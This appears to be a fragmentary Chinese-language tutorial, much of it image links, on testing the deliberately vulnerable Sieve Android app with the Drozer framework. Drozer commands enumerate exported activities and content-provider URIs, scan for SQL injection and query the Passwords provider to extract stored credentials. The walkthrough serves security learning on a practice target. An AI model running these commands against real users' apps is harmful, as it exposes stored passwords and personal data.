...
![image-20200323145839773](https://i.loli.net/2020/03/23/H1ubzFpkPylJ4OC.png)
...
![image-20200323152045767](https://i.loli.net/2020/03/23/rnxMjLdhG7XvFIQ.png)
...
![image-20200325164417700](https://i.loli.net/2020/03/25/7rinHakSmXOCy1R.png)
...
![image-20200325172230954](https://i.loli.net/2020/03/25/mQ9vNdS4zGu5AhJ.png)
...
![image-20200325170145671](https://i.loli.net/2020/03/25/rgYaRcxUhIMVQp9.png)

**中文乱码解决方法：**

使用`run app.package.list`命令可能会出现中文乱码，下面是我在网上找的解决办法，找到下图路径下文件进行对应修改，就可以了。亲测有效！

![img](https://i.loli.net/2020/03/25/WJugIejU8d79pyY.png)

![20200317171434174.png](https://i.loli.net/2020/03/25/PiK4G1xgjIaeZlC.png)
...
![image-20200323154127954](https://i.loli.net/2020/03/23/1LSyKnO64iDM5pt.png)
...
![image-20200325171038417](https://i.loli.net/2020/03/25/tEFABOVJl52P6va.png)
...
//显示暴露的Activity信息
```
![image-20200325173246279.png](https://i.loli.net/2020/03/25/VIjZwCiOTB6Qchp.png)

根据名称可以猜测出`.FileSelectActivity`可能是和文件有关，`.MainLoginActivity`就是主界面，`.PWList`可能和密码有关。

正常使用app需要输入PIN或者密码才能进去主界面，

![image-20200325174056229.png](https://i.loli.net/2020/03/25/UiW2CqJYlc3E4mG.png)
...
![image-20200325174409332](https://i.loli.net/2020/03/25/4Yc1fHxKX5NZsSr.png)
...
![image-20200401165434950.png](https://i.loli.net/2020/04/01/DhrXCIodKA6U3uZ.png)

```bash
dz> run app.provider.finduri com.mwr.example.sieve     //枚举uri
```

![image-20200401165757983](https://i.loli.net/2020/04/01/a6VeIRUypDYiCzQ.png)
列出了可访问内容URI的列表和路径
...
![image-20200401171307757](https://i.loli.net/2020/04/01/QfLMEex1olyTF2O.png)

```bash
dz> run scanner.provider.injection -a com.mwr.example.sieve     //检测可利用uri，检查sql注入
```

![image-20200401170715079](https://i.loli.net/2020/04/01/OvqE4BKm1IRoV7A.png)
...
![image-20200401173126269.png](https://i.loli.net/2020/04/01/adROPLf81oWsjnC.png)

```bash
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/     //获取数据库数据（即为之前保存的密码，邮箱信息）
```

![image-20200401171654224.png](https://i.loli.net/2020/04/01/p5lW2XtSJgCVAwG.png)
...
![image-20200401172340504](https://i.loli.net/2020/04/01/UbapG4iVgA3W8oh.png)
